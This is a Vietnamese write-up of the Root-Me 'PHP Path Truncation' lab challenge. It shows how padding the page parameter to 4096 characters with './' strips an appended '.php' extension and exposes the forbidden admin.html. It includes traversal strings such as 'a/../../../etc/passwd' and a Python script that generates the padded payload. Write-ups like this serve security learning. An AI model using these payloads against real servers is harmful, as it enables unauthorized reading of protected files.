# [PHP - Path Truncation](https://www.root-me.org/en/Challenges/Web-Server/PHP-Path-Truncation)
Challenge có Đường link dẫn đến 2 chỉ mục này là:
```url
http://challenge01.root-me.org/web-serveur/ch35/index.php?page=home --> 200
http://challenge01.root-me.org/web-serveur/ch35/admin.html -->403
```
Ý tưởng đầu tiên đó là khai thác tham số truyền vào `page` để đọc file `admin.html`     
Có vẻ như trang Web đã được lập trình tự động thêm `.php` vào sau tham số page nhận được từ request.
```exampe
home ----> home.php
```
<b>Path Truncation</b> là thuật cắt bớt đường dẫn để bỏ qua phần nối của phần mở rộng tệp. Điều này dẫn tới câu hỏi là một đường dẫn tuyệt đối có độ dài bao nhiêu ? Vì có thể thêm các kí tự không có nghĩa vào để đường dẫn đạt tối đa và —> Bypass       
Không thể tấn công bằng đường dẫn tới `admin.html` được mà phải là một đường dẫn không có thực.
```
VD:
../../../etc/passwd    ----> No
a/../../../etc/passwd  ----> Yes

Thử challenge với path:
a/../admin.html
```
Độ dài tối đa của một đường dẫn là `4096` kí tự và `a/../admin.html` gồm 15 kí tự. Vậy cần 4081 kí tự không có nghĩa chèn vào đường dẫn.        
Có thể thấy trong đường dẫn các kí tự sau đều trả về thư mục hiện tại.
```
a/../admin.html/./././././    =     a/../admin.html
```
Code
```python
import os

# Đường dẫn cơ sở của bạn
base_path = "a/../admin.html/"

# Độ dài mục tiêu của đường dẫn
TARGET_LENGTH = 4096

# Tính toán số ký tự padding cần thêm
padding_length = TARGET_LENGTH - len(base_path)

# Tạo chuỗi padding bằng cách lặp lại './' và thêm ký tự cuối cùng nếu cần
num_repeats = padding_length // 2
remainder_char = "." if padding_length % 2 == 1 else ""

# Tạo chuỗi padding
padding = "./" * num_repeats + remainder_char

# Kết hợp đường dẫn cơ sở và padding
long_path = base_path + padding

# In độ dài của đường dẫn đã tạo để xác minh
print(f"Độ dài đường dẫn: {len(long_path)} ký tự")
print("---")
# In toàn bộ đường dẫn mà không bị cắt ngắn
print(f"Đường dẫn dài đã tạo: \n{long_path}")
print("---")

# Chuẩn hóa đường dẫn bằng os.path.normpath()
normalized_path = os.path.normpath(long_path)

# In đường dẫn đã chuẩn hóa để chứng minh kết quả cuối cùng
print(f"Đường dẫn sau khi chuẩn hóa: {normalized_path}")

```
Sau đó sửu dụng Burp Suite để sửa Request gửi lên. để lấy flag.